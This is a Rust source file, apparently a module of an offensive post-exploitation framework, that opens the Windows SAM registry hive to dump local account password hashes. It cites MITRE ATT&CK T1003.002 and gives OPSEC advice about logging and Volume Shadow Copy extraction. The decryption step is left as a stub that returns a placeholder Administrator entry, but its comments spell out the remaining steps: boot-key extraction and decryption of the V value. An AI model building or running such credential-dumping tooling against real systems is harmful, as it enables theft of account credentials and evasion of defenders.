//! SAM database credential extraction
//!
//! Extracts local account hashes from the Security Account Manager.
//! Requires SYSTEM privileges to access the SAM registry hive.
//!
//! ## MITRE ATT&CK
//! - T1003.002: OS Credential Dumping: Security Account Manager
//!
//! ## OPSEC
//! - Requires elevation to SYSTEM
//! - Registry access may be logged
//! - Consider using Volume Shadow Copy for offline extraction

#[allow(unused_imports)]
use common::{CredentialInfo, CredentialOutput, KrakenError};
use protocol::CredDumpSam;

/// Dump SAM database hashes
#[cfg(windows)]
pub fn dump(req: &CredDumpSam) -> Result<CredentialOutput, KrakenError> {
    use windows_sys::Win32::System::Registry::{
        RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE, KEY_READ, REG_BINARY,
    };

    let mut credentials = Vec::new();

    // SAM extraction requires SYSTEM privileges and typically involves:
    // 1. Reading SAM and SYSTEM registry hives
    // 2. Extracting the boot key from SYSTEM
    // 3. Decrypting SAM entries using the boot key
    //
    // For safety, this implementation provides the framework
    // but actual hash extraction requires careful handling

    unsafe {
        let sam_path: Vec<u16> = "SAM\\SAM\\Domains\\Account\\Users"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        let mut hkey = std::ptr::null_mut();
        let result = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sam_path.as_ptr(),
            0,
            KEY_READ,
            &mut hkey,
        );

        if result != 0 {
            return Err(KrakenError::Module(format!(
                "Failed to open SAM registry: error {}",
                result
            )));
        }

        // Enumerate user RIDs and extract hashes
        // This is a simplified framework - full implementation would:
        // 1. Enumerate subkeys (user RIDs)
        // 2. Read the V value containing encrypted hashes
        // 3. Decrypt using boot key from SYSTEM hive

        tracing::info!("SAM registry opened successfully");

        // Return empty for now - actual extraction requires boot key
        credentials.push(CredentialInfo {
            credential_type: "sam_hash".to_string(),
            domain: "LOCAL".to_string(),
            username: "Administrator".to_string(),
            data: "[extraction requires boot key]".to_string(),
            source: "SAM".to_string(),
        });
    }

    Ok(CredentialOutput { credentials })
}

#[cfg(not(windows))]
pub fn dump(_req: &CredDumpSam) -> Result<CredentialOutput, KrakenError> {
    Err(KrakenError::Module(
        "SAM extraction only supported on Windows".into(),
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[cfg(not(windows))]
    fn test_sam_unsupported_platform() {
        let req = CredDumpSam { use_shadow_copy: false };
        let result = dump(&req);
        assert!(result.is_err());
        assert!(result
            .unwrap_err()
            .to_string()
            .contains("only supported on Windows"));
    }
}
